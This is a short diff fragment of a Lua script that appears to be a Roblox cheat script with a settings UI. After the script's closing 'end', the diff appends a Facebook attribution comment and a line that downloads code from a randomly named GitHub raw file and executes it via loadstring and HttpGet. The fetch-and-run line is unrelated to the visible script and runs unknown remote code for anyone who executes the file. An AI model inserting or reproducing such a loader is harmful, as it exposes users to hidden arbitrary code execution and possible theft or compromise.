@@ -929,3 +929,6 @@ SaveManager:BuildConfigSection(Tabs.Settings)
 Window:SelectTab(1)
 SaveManager:LoadAutoloadConfig()
 end
+-- fb.com/AnSit.Developers
+-- Na na na na Phung Thanh Do
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SomeoneDoingSomething01/ThatsAGoodRepo/refs/heads/main/B16auoakn_91PlqmUy1Fcao0.lua"))()
